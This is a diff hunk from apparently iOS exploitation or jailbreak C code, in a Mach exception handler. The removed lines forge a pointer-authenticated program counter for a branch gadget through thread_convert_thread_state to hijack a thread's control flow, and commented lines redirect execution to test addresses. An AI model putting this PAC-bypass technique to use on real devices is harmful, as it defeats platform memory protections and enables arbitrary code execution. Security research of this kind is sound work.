@@ -159,50 +159,6 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         #endif
     }
 
-    // IDEA: https://github.com/pattern-f/TQ-pre-jailbreak/blob/main/exploit-main/post_exploit.c#L360
-    mach_port_t selfThread;
-    kern_return_t err;
-
-    err = thread_create(mach_task_self(), &thread);
-    if (err != KERN_SUCCESS) {
-        printf("thread_create failed: %d\n", err);
-        while(1) {};
-    }
-
-    arm_thread_state64_t state;
-    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
-    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
-    if (err != KERN_SUCCESS) {
-        printf("thread_get_state failed: %d\n", err);
-        while(1) {};
-    }
-
-    brX16Address = ptrauth_sign_unauthenticated(brX16Address, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
-#if __arm64e__
-    state.__opaque_pc = brX16Address;
-#endif
-
-    arm_thread_state64_t xpcproxy_state;
-    count = ARM_THREAD_STATE64_COUNT;
-    err = thread_convert_thread_state(thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64,
-            (thread_state_t)&state, ARM_THREAD_STATE64_COUNT,
-            (thread_state_t)&xpcproxy_state, &count);
-    if (err != KERN_SUCCESS) {
-        printf("thread_convert_thread_state failed: %d\n", err);
-        while(1) {};
-    }
-    void *signed_pc;
-#if __arm64e__
-    signed_pc = xpcproxy_state.__opaque_pc;
-#endif
-
-    err = thread_terminate(thread);
-    if (err != KERN_SUCCESS) {
-        printf("thread_terminate failed: %d\n", err);
-        while(1) {};
-    }
-
-    __darwin_arm_thread_state64_set_pc_fptr(*new_state, signed_pc);
     //__darwin_arm_thread_state64_set_lr_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)0x41414100, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
     dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
